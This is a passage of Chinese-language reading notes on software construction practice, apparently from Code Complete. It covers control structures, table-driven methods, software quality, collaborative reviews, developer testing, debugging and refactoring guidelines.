通过名称来体现，比如第一行语句中，有一个 ‘initial’ 字样； 使用参数来实现，例如第二行语句，调用第一行语句的返回结果； 引入状态变量，后续的语句通过检查状态变量，来判定是否按顺序正确执行（增加了代码的复杂度，有利有弊） 使用注释来实现（最最无奈的一种办法） 无顺序的语句 让代码能够自上而下的阅读，而不需要让眼睛在整段代码上下来回跳来跳去，这样增加了阅读的负担，让代码变得不容易理解了； 相关的语句放在一起，检验标准：通过给代码画框框来检查，如果框框有重叠，说明有些语句流落在外，有必要调整位置； 当相关语句放在一起时，就会发现有些部分，很适合组织成另外一个子程序，这样有利于模块化； 条件语句 If 语句 if 语句用于处理正常情况，else 用来处理异常情况，而不是反过来（原因：这样让代码更容易阅读和理解，避免阅读过程中思路被各种异常处理打断）（也可以避免出现 if not notFound 的搞笑情况） if 后面接一条有意义的语句，而不是放到 else 中（这样可以重点先看有意义的正常情况） if 后面永远要有一个 else，即使里面放一条空语句也没有关系；（原因：避免遗漏考虑其他情况） 注意等量判断是否使用正确，例如 &lt; 和 &lt;&#x3D; ，&gt; 和 &gt;&#x3D;（特别注意一下相等的情况，是否包括在内） else 语句也需要进行测试； 注意检查 if 和 else 的内容是不是写反了； if-then-else 语句 可以使用布尔判断来简化语句逻辑（相当于将每一次的判断，抽象成另外一个子程序，在里面执行判断，然后返回布尔值做为结果；这种做法可以大大降低代码的阅读理解难度）； 出现频率最高的情况，放在语句的最上层； 如果可能，使用语句内置的 case 功能来替代这种语句；（case 更加直观易于理解） 最后的 else，放入异常处理，用来给自己提示没有考虑到一些出错的情况； case 语句 顺序 如果所有的 case 重要性都相同，那么可以按字母排序，这样比较容易检索； 如果重要性不同，重要的在前面； 如果发生频率不同，经常发生的在前面；方便别人快速查看常见情况； 如果有异常情况，正常情况在前面，异常情况在后面； 原则 简化每个 case 的操作；如果操作很复杂，则提取成一个子程序； 不要刻意制造中间变量，应该使用真实的变量；原因：因为 case 为执行严格的映射，创建的变量不一定符合这个映射，导致出错；如果 case 的数据结构复杂，改用 if-then-else 不要越过 case 的末尾（即每个 case 的末尾都有一个 break）； 不要将 default 用于伪造的默认情况（即把最后一种情况当作默认情况，而非真正的默认情况），原因：这样会导致未来修改不方便，也容易出错； 建议将 default 用于错误检查，以便没有找到对应的情况时，尽快报错； 控制循环 带中途退出的循环 将所有的退出条件放在一起，而不是分散在程序各处，不然会给测试带来麻烦，也容易出错； 如果所有语言不支持直接中途退出，则使用注释说明下退出的操作意图； 循环控制 进入循环 永远只从头位置进入循环 紧挨着循环语句开始的前面位置，进行初始化；原因：未来如果有任何的变更和复制代码，不容易漏了初始化的操作； 优先使用 for 循环；如果确实 while 循环更适用的时候，使用 while 循环 使用 while(true) 来表示无限循环（可以在中间使用 break 结束）； 循环体 用花括号 {} 将循环体包起来；原因：视觉上对起点和终点一目了然； 不要使用空的循环体；原因：容易让人莫名其妙； 一个循环只做一件事，避免做多件；如果担心性能问题，写条注释，说明此处可以合并，然后等将来性能出来问题时，再回来合并； 循环内务操作（例如 i++）只出现在两个位置，要么循环头，要么循环尾；不要出现在中间；原因：这样可以让代码更清晰； 退出循环 确保循环一定会退出（或者应该尽量 map 和 filter 之类）； 确保循环的退出条件看起来很明显； 不要为终止循环，胡乱修改循环下标的值； 不要在循环结束后，使用循环下标来做其他事情； 提前退出循环 如果语言支持，使用带标号的 break ，这样可以明确知道是退出哪一层的循环（有嵌套的情况下） 如果能够不用 break 和 continue，尽量不要使用；如果一定要用，那么： 在循环开头使用 continue 不要让多个 break 散布在循环各处，而应集中在一个地方（原因：有利于在一个地方统一思考退出的场景，减轻大脑的思考负担； 循环变量 如果有嵌套循环，那么应该使用有意义的变量名称作为循环下标；这样也可以避免循环下标用串； 用整数或者枚举类型作为循环下标，而不是浮点数； 如果可以，让循环下标的作用域局限在其定义的循环体内（原因：更进一步减少串用的风险） 循环的长度 尽可能短 嵌套在3层以内； 如果太长，转移部分内容到子程序； 如果需要很长，限制只能有单一出口，即最多只有一个 break 创建嵌套循环的办法：由内而外，从最内层最简单的一件具体事情开始，然后逐步拓展到外面； 不常见的控制结果 子程序中有多处返回的使用场景（注：一般情况下不推荐有多个 return，除非是以下是以下两种情况，原因：如果有多个 return，当它们的间距很远时，会导致读后面代码时，忘记了前面的提前退出的可能性） 用防卫语句判断错误，提前返回； 如果多个 return 可以让代码变得更清晰，那么就使用它； 递归 递归是一个非常强大的工具，但不要把它用在不合适的地方，因为它也有两个缺点，一是不知道需要需要使用多少内存空间，可能存在栈溢出的风险；二是有可能速度很慢（存在重复计算的可能性，例如用来求解斐波契列）； 在使用递归之前，先考虑下是否有可能通过栈和循环解决，实在不行的情况下，再考虑使用递归； 注意事项 限制在一个子程序内使用（即使用的时候，不要去调用另外一个子程序；原因：这样做会极大的增加复杂度，让代码更加不容易被理解） 留心栈空间； 确保递归可以终止； 使用安全计数器（避免出现无穷递归）； 表驱动法 表查询在很多情况下可以很好的处理复杂的 if-else 控制链（表驱动法：将各种情况存在表中，可以把它理解成数据库中的表，将各种情况存在一条一条的记录，然后根据需要去查询调用它们；如果场景数量不多，也可以硬编码写在数组里面，缺点是将来变动时，需要改动代码，存在表里面则不用）； 在一些情况下，表驱动法还可以用来作为复杂的继承结构的替代方案； 当将数据存储在外部的时候，如果情况发生变动，甚至可以不改动代码，而只需简单更改一下数据库即可以满足变动的需求； 使用表驱动法需要先解决两个问题： 如何查询数据：直接访问法、索引访问法、阶梯访问法（或叫分段访问，或折半访问） 需要在表里面存一些什么内容，有时候只是数据，有时候是动作，然后需要将动作映射到另外的子程序名称中； 索引访问法：除了主数据表外，另外建一张索引表，通过访问索引表，获取主数据表的id，然后再访问主数据表；好处： 索引表一般都很小，相对于主数据表，它更加节省空间； 索引表的访问，可以做成一个独立的子程序，这样相当于多增加了一层抽象，未来也更加容易维护； 索引表的访问，速度一般更快；（注：基本上所有的数据库都支持索引技术，所以只需好好利用就可以了） 阶梯访问法：根据数据的分段，以及各段对应的值，写一个子程序，循环的进行判断，当超过某一临界点时，进入那一段，再次判断，如果超过，进入下一段，如果没超过，取值； 注意临界点的判断，是 &gt; 还是 &gt;&#x3D; ，需要考虑清楚； 当列表很长时，考虑使用二分（折半）查找，而不是顺序查找，以便能够提高速度 将查找方法提成一个子程序； 如果对速度要求非常高，则应考虑是否可以使用索引的方法来替代； 一般控制问题 布尔表达式 使用 true 和 false 来做布尔判断，而不要使用 0 或 1，因为它们很模糊，经常容易用错； 隐式的比较布尔值，而不是显式，例如，应用 if (a &gt; b)， 而不是 if ((a&gt;b) &#x3D;&#x3D; true) 简化复杂的布尔判断的几种方法： 拆分复杂的布尔判断，引入更具名称意义的中间变量； 将布尔表达式封装成一个布尔函数，这样阅读的人也更容易理解，甚至无需关心函数里面具体是如何实现的； 使用表驱动法来替代复杂的 if else 判断； 尽量编写肯定形式的表达式 将 if 语句中的否定判断，转换成肯定判断，如果是错误处理，则可以通过引入一个中间变量或者封装一个布尔函数，同时做好命名，来达到目的； 考虑使用狄摩根定理来简化否定的判断，例如 if ( !Aok || !Bok )，改成 if ( ! (Aok &amp;&amp; Bok)) 尽量多使用括号让整个表达式更加清晰易懂，而不是依赖于语言的求值顺序； 对于数值表达式，采用与数轴位置相符的顺序进行书写，能够让整个表达式看起来更加直观易懂，因为它能够直接映射到大脑中的画面； 0 可以用于很多的比较场合，但是除了真正处理数值以外，其他场合都不建议使用跟 0 做比较（包括布尔，字符，指针等场合），因为那么样很不直观，不容易一眼看明白是什么意思； 空语句 由于空语句并不常用，所以有必要突出它；如果可以的话，可以考虑通过一个通用的 doNothing( ) 或者 pass( ）子程序来处理； 避免出现深层嵌套，方法如下： case if-then-else 抽取子程序 对象的多态分派； 重复判断一部分条件； 引入状态变量 使用防卫语句提前退出； 使用异常； 结构化编程 思想：单一入口，单一出口； 程序只由三种结构组成，包括：顺序，选择（例如 if-else, case 等），迭代（即循环） 非以上三种的其他部分，使用时值得警惕，包括 break, continue, goto, throw-catch, return; 控制结构与复杂度 由于大脑在同一时间能够记忆的东西是有限的，因此，如果需要处理的东西越少，大脑便能越清晰的思考问题，使它不容易出错；反之，如果东西越多，则大脑越容易发生混乱，从而导致出错率上升； 如果可能的话，一段程序中的决策点数量，不要超过5个； 软件质量概述 质量的外在特性和内在特性：前者是用户关心的（正确、可用、可靠、快速、兼容、精确、健壮），后者是程序员应该考虑的（可移植，可重用、可维护、灵活、可读、可理解、可测试）； 提高软件质量的方法 明确质量目标：如果不明确，可能需求人员预期的质量目标和开发人员实际完成的目标，会存在偏差；（目标示例：程序可读性、减少内存占用、最少代码量、减少计算时间等） 明确质量优先级：明确将质量放在第一位，会促使开发人员有意识的调整自己的行为； 明确测试的策略：测试不是提高质量的最好办法，它只是一种预防措施，避免出现事故；如果将它当作首要办法，将出现大问题； 软件开发指南：将一套成熟的开发流程，实施到日常的开发活动中，有助于提高质量水平，减少各种散乱的作法； 非正式检查：开发人员自己检查代码，或找同事帮忙检查； 正式检查：闸口式的检查，过了一关，才能进入下一关；它的目标不是要求软件尽量完美，而是评估做到何种程度，算是已经完成预定的首要目标，可以开始下一阶段的活动； 好的开发实践 对需求变更进行严格的控制：失去控制的需求变更，将来带来灾难；在需求进入开发之前，确保需求是已经被认真思考过的，而不是拍拍脑袋决定出来的；在对需求变更时，为其设置审查的关卡，确保需求的变更，不会轻易进入到开发环节； 结果的量化：对质量改善的结果进行量化；无法量化，或者没有量化的质量控制办法，是无效的，因为我们不知道到底那些做法起了作用，以及起了多大的作用，以及无法做出针对性的调整； 制作原型：使用原型，可以极大的完美软件的设计，更接近用户的需求，以及更好的可维护性；包括：界面的原型（可用性），算法的原型（性能），数据集的原型（内存）； 不同方法的效能 多种方法组合的效能，比单一方法高；从多个角度观察事物，总会暴露出更多的问题； 检查比测试的成本更小； 修正缺陷的时间点越早，修正的时间成本越低；原因：因为此时开发人员对代码的印象更深 推荐的组合拳 对所有的需求、架构及关键部分的设计，进行正式的检查； 建模或者创建原型； 代码阅读或者检查；包括：个人检查 desk-checking、代码复查 code-review 等 执行测试； 控制需求 越早发现错误，带来的影响越小，而需求错误，将带来一系列严重的后果；因此，对需求的有效性，进行严格的控制，可以减少大量的错误返修成本； 软件质量的普通原理 在很多时候，很多公司花了大约50%的时间，在调试各种错误，而不是编写代码上；因此，执行严格的质量控制，反而可以提高软件开发的效率和速度，从而降低开发的成本；与传统的“编码-测试-调试”相比，先进的质量控制计划，更加省钱和省时； 协同构建 协同开发的概要 它是质量保证的补充：当人们意识到他们的代码会被检查时，他们就会在潜意识里面，更加认真对待并检查自己的代码，从而减少了错误发生的概率； 协同构建有利于知识和经验的传播：它可以在短时间内，将小组内的开发人员，都提高到优秀程序员的水平； 集体所有权的好处：单个程序员离开的影响最小化、缺陷可以更快的被修正（谁有空谁上）、多人的检查使得代码的质量更好； 在构建前后的其他环节，建议都保持协作的习惯（包括评估、计划、需求、架构、测试、维护等）； 结对编程 关键 采用统一的编码规范，原因：避免两个人将时间浪费在对编码风格的争论上； 不要在简单的问题上使用结对；如果出现这种情况，更建议两人在白板上画一下思路，然后各自行动； 鼓励双方跟上对方的步伐，如果两人差距太大不可弥合，可能需要拆散重组； 避免新手组合，两个人至少有一个要有结对的经验； 指定一名组长，由其对外联络并对结果负责； 不要让结对变成旁观，确保双方都积极主动的参与； 定时或不定时进行轮换； 确保两个人都可以看到显示器；（可以考虑外接到两个屏幕） 避免将关系紧张的人进行结对； 好处 人在轻微压力下，更容易保持专注的状态； 提高代码的质量：代码的可读性和可靠性向团队最优秀水平不断接近； 缩短开发的时间：构建的时间增加了10%-20%，但调试的时间减少了80%； 传播公司的文化、提高员工的技术、培养员工的归属感； 正式检查 涉及的角色：主持人，评论员，记录员（有可能由评论员兼任），代码作者； 步骤 计划：主持人定哪些人参加，参加的时间地点，并提前分发材料和核对表，材料需要有行号，以便方便定位； 准备：评论员阅读材料，找出其中的错误；如果可以的话，给评论员分派不同的视角或场景（原因：站在不同的角度进行思考，可以发现更多的问题） 开会： 过程：主持人挑选一名评论员，阐述设计或代码的逻辑，并提出他发现的错误；大家进行讨论，确认这是否为一个错误；确认后，记录员记录下错误的类型和严重级别；讨论结束，进行下一个错误； 注意事项： 不要在讨论中涉及解决方案；作者享有对错误的接受和处理的最终权利；其他人的责任在于发现更多的可能的潜在问题； 会议不要超过2个小时（原因：人的注意力很难连续集中保持2个小时，超过限度后，效率开始大幅下降） 报告：会议结束后，主持人写一份总结报告，列出发出的所有缺陷和严重级别（目的：用于改进核对表；用于统计会议花费时间和找出缺陷的数量，可以计算成本和收益） 返式：将发现的缺陷，分发给作者进行修改； 跟进：可以有3种方法，一是重新来一次正式检查；二是只检查发现缺陷的地方；三是允许作者修改后不再检查； 小会：在不超过2个小时的会议结束后，如果有人对讨论解决方案有兴趣，可以另外安排1个小时的会议，用来讨论解决方案； 自尊心问题：设计和代码的作者对缺陷享有最终的确认权和处理权，其他人只是提出缺陷的可能性；开会过程中不允许出现批评，建议更多的使用“可能”语句，例如“这里可能有一个缺陷…” 其他协同开发实践 走查：貌似效果不太好； 代码阅读：其实它是正式检查的一部分，仅仅是省略掉了开会讨论的环节；对于异地分布的团队，这个方法更合适一些； 开发者测试 开发者测试的用途 评估可靠性 用于调试 制作错误检查表（避免下次犯同样的错误） 推荐方法 测试需求点：确保需求都已经被实现； 测试设计关注点：确保设计都已经被实现； 加入基础测试和数据流测试（什么是基础测试？详见下一节）； 制作检查表，记录历史错误的类型； 写代码前，先编写测试用例（原因：先写，或者后写，所需时间没有变，但先编写，迫使更详细的思考和发现需求可能存在的错误；因为错误的需求，测试用例也很难编写；此时估计只能编写黑盒类型的测试用例）(按王垠的意见，很简单明显没错误的部分，可以不用写；没有把握的部分，要写） 测试技巧 结构化的基础测试 确保程序中的每条语句都会被执行一次；如果存在 if 语句，则需要计算有多少条路径，并根据每条路径设计一个测试用例； 数据流测试 数据状态有3种，分别是变量的已定义、已使用、已销毁；子程序的状态有两种，分别是已进入，已退出；它们的组合中，有8种反常的情况；在开始测试前，先检查一下，是否存在数据流反常；如果有，先纠正过来； 检查完之后，再进一步考虑是否已经覆盖所有“已定义-已使用”组合的情况； 貌似有专门的检查工具，可以考虑使用 等价类划分：去除冗余的测试用例 一个好的测试用例，应该可以覆盖输入数据中的很大一个范围段；如果两个测试用例所能提示的错误完全相同，则只需要一个测试用例就够了； 猜测错误 如果手头有一份过去总结的常见错误核对表，那么可以基于这份表格，对常见的错误进行猜测检查； 边界值分析 假设存在一个边界值，那么分别用小于、等于、大于这个边界值的数据进行测试，检查结果是否符合预期； 使用坏数据测试 数据太少 数据太多 数据错误 数据长度错误 数据未初始化； 使用好数据测试 正常的情形 最小的正常局面：例如 EXCEL 中只保存一个空的单元格，Word 中只保存一个空格； 最大的正常局面：例如 EXCEL 中将所有单元格都填写上数据； 与旧数据的兼容性：当使用新的子程序替代旧的子程序的时候进行； 使用容易进行手工测试的数据，例如 10000， 比 16549 要好（原因：前者易于手工输入，而它们所能提示的错误并没有区别） 典型错误 80&#x2F;20 法则 错误在程序中并非均匀分布，而是 80% 的错误分布在 20% 的类或者子程序中；（因此，王垠的方法，貌似更有道理了） 50 % 的错误存在于 5% 的类中； 20% 的类占据了 80% 的开发成本； 错误的分类 大多数错误的影响范围有限，并且容易修正； 大多数错误发生的根源在构建之外，例如缺乏应用领域的知识，频繁变动且矛盾的需求，缺乏有效的沟通和协调； 大多数编码错误是由程序员制造的，而由编译器或系统制造的极少； 拼写错误是一个常见的错误； 每个团队的常见错误类型可能不太一样（做一份自己的核对表很有必要） 测试本身的错误 测试用例本身也有可能包含错误，尤其是没有认真编写并谨慎对待的情况下；这时会导致花费很多时间在无效的代码错误排查上面；因此，有必要一开始像对待代码一样，认真的编写测试数据，并把单元测试集成到后续的测试中，确保测试数据不是一次性的使用，这样可以增加严肃对待的可能性；（此处又进一步证明了王垠的观点，测试过多，本身也会引入错误，浪费无谓的时间） 测试工具 脚手架：哑类、伪造函数、哑文件；市面上有各种主流的脚手架工具，使用它们，虽然一开始会花费一点时间，但这是值得的，因为这些工作只需完成一次，未来就可以不断的持续使用，是一件投入产出比很高的事情； diff 工具：能够比对预期结果和实际结果的工具，例如 js 里面的 chai.js 测试数据生成器：如果可以的话，使用测试数据生成器，这样可以扩大测试用例的数据覆盖范围，发现一些常规少量数据难以发现的错误，并且过程是自动化的（产生相同错误种类的测试数据，只需要一份就可以了，关键可能还在于边界值）； 覆盖率监测器：通过该工具可以发现现有的测试用例，覆盖了哪些代码，还有哪些没有覆盖，可以帮忙进一步完善测试用例； 日志记录器：用来记录日志； 符号调试器：它会一行一行的执行代码，然后观察代码产生的值，这样有利于观察整个程序是如何一步一步执行运转的（单步调试，跟踪变量的值），从而暴露出一些之前没有考虑到的问题；同时它也是一个了解所使用语言的好工具，可以更清楚的看到，各种高级语言是如何工具的； 系统干扰器：针对会对内存进行操作的场景，包括：内存预填充（用来发现未对变量进行初始化的错误）、内存抖动（用来发现内存引用是使用相对值，而非绝对值）、选择性内存失败（用来测试边界情况，例如内存溢出时程序的处理）、内存访问检查（用来确保所有的指针在程序运行期间都处于正常的工作状态） 错误数据库：BUG 跟踪处理工具，例如JIRA、禅道等 改善测试过程 测试计划：从重要性而言，有必要将测试放在同设计和编码一样重要的位置，并在项目开始之际，就为测试分配时间，提前拟定测试计划；目的：让测试可重复，然后可以进一步完善； 自动化测试：很有必要进行，因为它可以让回归测试更加省时间，重要的是，这样我们就可以频繁的使用它们，在每次代码做出一小点修改时，就马上运行测试，将问题在早期及时发现并解决；另外它也为重构提供了一定的安全保障； 保留测试记录： 用于统计，显示是否项目的质量在朝着更好的方向发展，还是没有什么变化；如果没有变化，则需要采取相应的措施，提高项目开发的质量； 除了常规缺陷管理软件所要求记录的字段外，建议增加以下字段： 缺陷种类字段，用于统计哪一种类型的错误较频繁出现，并有针对性的改进； 缺陷涉及的类名和子程序名：用于统计哪一个类出现的错误数量最多（原因：80&#x2F;20法则） 个人测试记录：用于收集自己觉出现的错误，有利于改进自己的编程习惯，减免后续再发生相同的错误； 总结 测试数据出现错误的概率，经常比编写代码本身还要高；因此很有必要非常认真审慎的对待测试代码的编写； 关于开发者测试的本质，更重要的是在于提高开发编码过程的质量，从而减少在调试环节需要花费的时间； 调试 概述 调试是迫不得已采取的手段，提高编码质量本身才是王道； 质量、成本、时间，三者在开发过程中并非对立冲突，它们是可以兼得的，关键在于先控制住质量； 认真对待调试的好处： 进一步理解正在编写的程序：如果它出错了，说明自己对它的某个地方并不理解，存在有知识的盲点； 明确错误的类型：总结常见的错误类型，指导自己未来不再犯错； 从代码阅读者的角度，分析代码的质量：从外人的眼光，客观的看待自己的代码，更容易找到可以改进的地方；（阅读的过程中，不断问“是什么”“为什么”） 审视自己解决问题的办法：有理有据、结构性的思考，不断改进自己调试的方法，而不是胡乱的猜测，有助于更快的定位问题并进行修正； 审视自己修正问题的办法：是从根本上系统性的解决问题，还是绷带式解决？ 总结：调试是一片富饶的土地，它隐藏着让自己进步的种子，要认真好好的对待它；（没错，深有体会） 寻找缺陷： 科学的方法 稳定错误，让它可重复发生；（如果一个错误无法稳定下来，大多数情况，可能跟某个变量没有初始化有关系，或者是空指针)（注：有时候也跟某个变量重复定义有关） 分析错误来源：包括收集数据、分析数据、提出假设、证实假设 修正缺陷 对修正的地方进行测试； 排查是否其他地方隐藏类似的错误，如有，逐一修正； 寻找缺陷的建议 对缺陷的原因进行假设时，考虑尽可能多的数据；原因：考虑越多的数据，就越能够从数据中找到出错的规律，避免浪费无谓的时间； 如果当前的测试用例，无法找出错误的根源，则可以尝试调整测试用例，在更大的薄范围内调整参数； 对代码进行独立的单元测试；原因：将大程度的测试，分解为对各个子程序的单元测试，更容易找出错误所位；（确保每一部分是否如预期中运行） 了解各种调试工具，在需要的时候拿来使用；原因：合适的工具会让某个困难的调试变得非常容易，例子：内存检测工具； 当以为已经找到原因时，根据原因，调整测试用例，看错误是否会重现；如果会，则说明问题仍然没有找到； 增加一些测试用例（数据和原有用例不同）；原因：这样会产生更多的执行结果，有利于进一步定位； 排除法：如果某个测试用例没有定位到错误，但它至少可以说明错误不出现在原来所假设的位置；此时可以用笔写下来已尝试并排除掉的点； 头脑风暴各种假设（即不要在一种假设上钻牛角尖，而应该先风暴出一大堆各种假设，写下来，然后再过滤；当一种不行时，换另一种；不要在一种假设上钻研太久） 缩小嫌疑代码的范围（可以考虑采用二分法，每次排除一半的代码；或者断点，日志输入，跟踪出错的位置） 特别关照一下已经产生过错误的类或子程序；原因：有过前科的，总是有很大嫌疑（80&#x2F;20法则）； 检查最近修改过的代码；先运行一下老版本，看错误是否存在；如果不在，则使用版本控制（例如 git ）比较两个版本，查看那些最近修改过的地方； 如果在一个小范围的代码内没有找到错误，可以考虑扩大范围，再重新使用二分法排除； 增量式集成；养成好习惯，每次只添加一点点，然后测试它，确保没问题后，然后再添加一点点；不要一下子写太多；（此点深有体会） 掏出常见错误核对表；它们是一份宝藏，养兵千日，用兵一时； 和其他人讨论；当向别人解释自己的程序时，经常会在不经意，发现自己原来思维的盲点，然后找到错误所在（原因：通过讲述，相当于换了一个角度思考问题；据说这叫小黄鸭方法） 去休息一下吧；原因：大脑需要从专注到放松两种状态间切换，才能避免它陷入某个局部点，调用更广阔的信息储备； 蛮力测试 这是一种常常被忽视的方法，原因在于我们总是有追求捷径的心理。好吧，这是人之常情。但是，需要为这种捷径设置一个时间的上限，比如5分钟，或者10分钟，当超过这个时间时，仍然没有找到错误原因，或许，是考虑使用蛮力测试方法的时候了。因为，重新编写代码可能也不过才花30分钟；（忽然理解了为什么很多人非常讨厌调试别人出错的代码，尤其是这些代码写得很不清晰的时候） 蛮力测试方法包括： 对崩溃代码的设计和编码进行彻底的检查； 抛弃有问题的代码，或者，抛弃整个程序，从头开始设计和编程； 编译代码时，生成全部的调试信息； 在最苛刻的警告级别中编译代码，不放过任何一个警告信息； 全面执行单元测试，并将新的代码隔离起来单独测试； 用另一个不同的编译器编译代码； 在另一个不同的环境中编译代码； 复制用户完整的系统配置信息； 将新的代码分成小段进行集成，对每次集成进行完整的测试； 语法错误 有时候，编译器给出的语法错误的行号并不准确，更有可能出现在所报行号的上下游； 当编译器给出几条错误时，第二条开始，经常是不太准确的，所以，先处理第一条，然后重新编译，再根据结果进一步行动； 分而治之：将一个大程序拆份成几个小部分，每次去掉一部分，看语法错误是否仍然存在； 修正缺陷 动手之前，务必先理解问题，而不是不懂装懂的开始动手，做法：先使用测试用例对问题进行定位，确保自己已经了解问题所在； 动手之前，通过设计测试用例，先验证问题的定位是否正确；假设知道问题可能由几个因素中的一个造成，那么，先通过测试用例排除掉其中不可能的因素； 理解代码的设计，即问题所在代码的来龙去脉，而不仅仅是单个问题； 如果压力很大，那么应该先休息一下；原因：大脑在放松的状态下，才可以进入发散的模式，调动更多背景知识进行全面的思考； 保存一份最初的源代码；原因：这样可以对修改后的代码进行比较，以及出问题时，可以恢复到初始状态； 治本，而不是治标；真正从根源上解决问题，而不是针对特例提出修补方案； 一次只一个改动；原因：超过一处的改动，会让人不知道是哪个改动真正解决了问题，或者引入了更多的问题，更加让人困惑； 反复检查自己的改动，确保与问题相关的方方面面都已经考虑到了；原因：如果考虑不全面，很可能解决一个问题的同时，引入了更多的问题；（因此很有必要了解来龙去脉） 增加能暴露问题的测试用例；如果原来的测试用例无法检查出已发生的问题；那么为该问题设计一个测试用例，并加到原来的用例集中，这样未来可以及时避免问题再次发生； 搜索类似的错误：问题就像小强，当你发现一只的时候，意味着背后已经有一群；注意：如果想不出来如何查找类似的错误，那么意味着没有真正搞明白这个问题的本质； 修改代码时，务必要有一个确定的理由，即确信自己的改动能够产生效果，不要无谓的东试西试，这样不仅会浪费时间，也会打击自己的信心； 调试中的心理因素 为了提高信息获取效率，我们的大脑总是会不自觉的忽略一些自认为不重要的信息；而很多时候，缺陷就隐藏在这类信息里面；因此，有两种避免这种现象的方法 养成良好的编程习惯；原因：这样当错误发生时，错误会显得比较与众不同； 给变量或子程序的命名，应该具体，避免使用一些模糊或者容易混淆的写法； 调试工具 源代码比较工具：检查自己的改动； 编译器的警告信息：重视并处理它们；最好把警告提示设置为错误提示，这样可以迫使自己更加慎重的对待它们；在项目组中，使用统一的编译配置文件，避免集成时被警告信息淹没； 语法和逻辑检查器：去毛工具 lint 性能分析器：可以用来查找程序执行的性能瓶颈； 测试框架和脚手架：编写测试用例，通过测试框架进行测试，是定位问题的好办法；另外，学会如何正确使用以及在什么时候使用调试器 重构 重构的基本准则：不断的提高代码质量；若非如此，则应避免假借重构进行胡乱修改； 重构的理由 代码重复、子程序太长、循环太长或嵌套太深 类的内聚性太差（例如搞出了万能类，此时应拆分成多个类）（类是带来状态的一种抽象，它的引用常常是不透明的，因此保持类的简单非常的重要，不然会增加很多复杂度） 类接口的抽象层次不一致（克制采用未经深思熟虑的紧急绷带方案的诱惑）（增加一个接口很容易，但使用和维护它却有可能成本很高） 子程序的参数列表太长（功能单一的子程序，参数一般都很少；如果参数很多，很可能说明子程序的功能不单一，没抽象好） 需要对多个类并行修改（有可能是个问题，也有可能不是，也有可能说明设计存在问题） 需要对继承体系多处并行修改 case 语句需要多处并行修改（说明可能使用继承更加合适)（好奇如何使用继承来代替 case ？会不会是使用多态？） 相关的数据项只是放在一起，没有组织到类中； 成员函数更多的使用了其他类的功能，而不是自身类的（说明这个函数很可能更适合放在其他类中） 过于依赖基本数据类型（例如 Money 更适合封装成一个抽象的数据类型，原因：它是一种人造的事物，本身带有一定的规则，这些规则可以通过抽象数据类型很好的设定和表达，也容易维护）； 一个类什么事也不做（原因：如果功能已经被其他类取代了，应考虑删除它） 一连串传递流浪数据的子程序（可能是问题，也可能不是；原则：反思这些帮忙传递数据的子程序，其接口所表示的抽象是否一致；如果不一致，或许需要重新设计抽象的结构，比如拆分成1父配多子）； 消除中间人，对接终端；如果某个类，绝大部分代码都在调用其他类，而自己啥功能也没有，应考虑去掉这个做为中间人的类，改成直接调用其他类； 某个类与其他类关系过于紧密（即知道的太多了，说明此处可能违反地隐藏信息的原则，宁可多隐藏出错，也不可少隐藏导致紧密耦合） 子程序命名不恰当：任何时候发现这个情况，都应马上着手进行修改； 数据成员设置为公用：违反了抽象和隐藏信息的原则；应让数据成员私用，然后通过访问子程序进行获取； 派生类只使用了基类的部分接口：说明很可能它们应该是合成的关系，而不是继承； 注释被用于对复杂难懂的代码进行解释：说明应该重写代码让其简单（不要为拙劣的代码编写文档，而是重写代码) 使用了全局变量（应考虑隔离它们，并使用子程序对其进行访问） 程序包含了未来可能用到的代码（说明出现了过度设计，应马上删除它们） 重构的类型 数据级的重构 用具名常量替代神秘数值； 为变量取有意义能够自解释的命名； 引入中间变量：通过有意义的中间变量命名，让表达式更加容易理解； 将重复的表达式抽象成函数； 用多个单用途的变量，取代一个多用途的变量；原因：多用途的变量很容易出错，还常常让人头大； 在局部作用域，尽量使用局部变量，避免修改传入的参数； 如果一个基础数据类型拥有功能，则应转化为类； 将一组类型码改为类或者枚举类型； 如果一组类型码对应的代码片段有不一样的功能，考虑转换化基类和派生类 如果数组元素的类型不相同，应考虑转换为对象； 用数据类替代传统记录，这样这些记录本身可以自带各种必要的操作，如错误检查，持久化等相关操作； 语句级的重构：（1循环 1null 2布尔 3条件） 使用 break 或 return 退出循环，而不是引入一个多余的循环控制变量； 创建和使用 null 对象，而不是去判断空值； 分解布尔表达式，引入中间变量，让布尔表达式的判断目的更加一目了然； 将复杂的布尔表达式替换为布尔函数； 合并条件语句中重复出现的代码，将它们放到条件的最后一种情况； 使用 return 退出条件语句，而不是引入一个多余的条件变量； 如果可能，使用多态，替换条件语句中的 case 子程序级重构：1独 2换 4对 将查询操作从修改操作中独立出来，避免出现某个 getTotal 函数竟然会改变对象状态的情况； 将复杂算法替换为简单算法（有可能会牺牲效率，但对于计算机来说，效率是最低优先级的考虑因素，提升的一点点微弱性能根本不值钱）（易读性对于维护更有意义，因为程序员的时间很值钱） 将冗长的子程序转换为类，然后在类内部，将子程序拆分为多个成员函数；目的：更加模块化，更加容易理解； 子程序是否内联化 如果子程序非常简单，一眼看得懂，则内联化； 如果不是，则应单独抽取出来，通过有意义的命名，简化阅读代码的理解难度； 参数个数多少 如果一个参数在子程序内部没有派上用场，删除该参数； 如果子程序需要从调用方获取更多的信息，增加参数； 合并还是拆分 如果两个子程序代码基本相同，只是使用的常量值不同，则应合并，然后将常量做为参数传入； 如果一个子程序，根据传入的参数，执行子程序内部完全不同的代码段，则应拆分它，让它变成两个或者多个子程序；原因：避免让子程序成为万能的，而是保持功能单一的； 传递成员还是对象 如果同一个对象的多个值，被传递给一个子程序，则考虑传递整个对象； 如果创建一个对象，并传入一个子程序，仅是因为要使用对象的某个值，则应考虑传入特定数据成员的值，而非整个对象；原因：避免兴师动众，杀鸡用牛刀； 类实现的重构（1代3对） 用数据初始化，替代虚函数；原因：如果一个虚函数的目的仅是返回某个常量，则可以将这个常量放在数据初始化中进行，不要整些没用的（虚函数）（虚函数的目的，是为了将指针的引用，稳定可靠的指向派生类的方法，而不是偶尔指向基类的方法，通过在方法前面加 virtual 关键字实现） 成员函数或成员数据的位置 上移：减少派生类中重复的代码； 下移：更加特例化，减少基类的冗余； 创建对象还是引用对象 对象很大很复杂：引用 对象很小很简单：创建 特殊代码与相似代码 相似代码：合并到基类中 特殊代码：转移到派生类中 类接口的重构 去除委托人（大家只和自己的朋友说话，不和朋友的朋友说话）、去除中间人（去中间化是这个时代的主题）、去除闲人（无所事事的类，功能拆分到其他类中，然后删除这个闲人）、去除万能人（如果一个类有不止一个的不相关功能，应拆分为多个类） 合成还是继承 只用到了其他类的部分接口，用合成； 用到了其他类的全部接口，用继承； 